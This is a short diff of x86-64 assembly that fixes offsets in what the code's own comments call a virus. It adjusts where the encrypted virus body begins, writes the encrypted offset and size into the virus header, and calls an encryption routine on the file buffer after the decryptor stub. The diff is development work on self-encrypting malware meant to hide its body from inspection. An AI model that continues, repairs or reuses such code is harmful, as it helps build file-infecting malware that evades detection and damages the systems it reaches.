@@ -170,17 +170,17 @@ _start:
     
     ; Write encrypted_offset at virus_start + 25 = 0x13df
     ; Store as offset from virus_start, not absolute file offset
-    ; virus_start = 0x13c6, decrypt_code.end = 0x1532
-    ; offset_from_virus_start = 0x1532 - 0x13c6 = 0x16c
-    mov qword [rdi + 1], 0x16c
+    ; virus_start = 0x13c6, decrypt_code.end = 0x156a
+    ; offset_from_virus_start = 0x156a - 0x13c6 = 0x1a4
+    mov qword [rdi + 1], 0x1a4
     
     ; Write encrypted_size at virus_start + 33 = 0x13e7
     ; Size = 0x637 bytes
     mov qword [rdi + 9], 0x637
     
-    ; Encrypt from decrypt_code.end (0x1532) for 0x637 bytes
+    ; Encrypt from decrypt_code.end (0x156a) for 0x637 bytes
     lea rdi, [rel file_buffer]
-    add rdi, 0x1532
+    add rdi, 0x156a
     mov rsi, 0x637
     call encrypt_buffer
     
